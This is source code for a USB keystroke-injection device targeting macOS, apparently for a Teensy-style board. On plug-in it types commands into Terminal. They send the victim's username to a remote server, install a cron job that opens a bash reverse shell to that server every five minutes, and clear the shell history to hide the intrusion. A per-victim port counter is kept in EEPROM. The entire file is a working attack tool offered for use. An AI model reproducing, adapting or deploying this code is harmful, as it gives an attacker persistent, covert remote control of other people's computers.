#include <EEPROM.h>

// Defining initial variables
int ds = 500;
int eepromAddress;
int eepromGetLastAddress = 0;
byte eeprom_value;
String terminalCommand;

void setup() {
  // short delay to set up the usb connection
  delay(1500);

  // open Terminal in spotlight
  openapp("Terminal");

  // open new terminal window
  cmd(KEY_N);

  delay(500);

  // Read eeprom address that stores individual port number for this computer
  eepromAddress = EEPROM.read(eepromGetLastAddress);

  // make sure we only use eeprom numbers smaller than 101 
  // because only theses addresses have port numbers as values from 100 - 200 are associated
  if (eepromAddress < 101) {

    // Getting port number associated to eepromAddress
    int portInt = EEPROM.read(eepromAddress);

    // Converting eepromAddres (Number of assigned port) from int to string
    String portString = String(portInt);
    
    // Creating port message and Done!-String
    String portMessage = "echo Port: " + portString + ";";
    String done = "echo Done!";
    String placeHolder1 = "echo  ; echo ------; echo  ; echo  ;";
    String placeHolder2 = "echo  ; echo  ; echo ------; echo  ;";
    
    // Sending username and assigned port number to mysql database
    typeln("USERNAME=\"$(whoami)\"; QUERY=$\"CURL -X GET http://12.SERVER-IP.234.56/index.php?n=$USERNAME&p=" + portString + "\";$QUERY");

    // Add reverse shell to crontab
    String BASH_ReverseShell = "crontab -l; echo \"*/5 * * * * bash -i >& /dev/tcp/12.SERVER-IP.234.56/" + portString + " 0>&1\" | crontab -;" + placeHolder1 + portMessage + placeHolder2 + done;
    typeln(BASH_ReverseShell);

    // Clear Terminal historyclear
    typeln("history -c");

    // Close Terminal
    cmd(KEY_Q);

    // Increase and store eepromAddress for next connection's port number
    eepromAddress = eepromAddress + 1;
    EEPROM.write(0, eepromAddress);
  }
  
  else {
    // Testing increase of Port Number after each connection
    typeln("ALL PORTS HAVE BEEN USED!");
  }
}
  
  
// Main loop is required but not used
void loop() {}
  

/*
   Helper functions
*/

// type a string (pressing enter at the end)
// we have extra delays so we can see what's happening
void typeln(String chars) {
  Keyboard.print(chars);
  delay(ds);
  Keyboard.println("");
  delay(ds * 4);
}

// open an application on OS X via spotlight/alfred
void openapp(String app) {
  // open spotlight (or alfred/qs), then the app
  cmd(KEY_SPACE);
  typeln(app);
}

void k(int key) {
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds/2);

  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds/2);
}

void mod(int mod, int key) {
  Keyboard.set_modifier(mod);
  Keyboard.send_now();
  Keyboard.set_key1(key);
  Keyboard.send_now();
  delay(ds);

  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(ds);
}

void ctrl(int key) {
  mod(MODIFIERKEY_CTRL, key);
}

void cmd(int key) {
  mod(MODIFIERKEY_GUI, key);
}

void shift(int key) {
  mod(MODIFIERKEY_SHIFT, key);
}
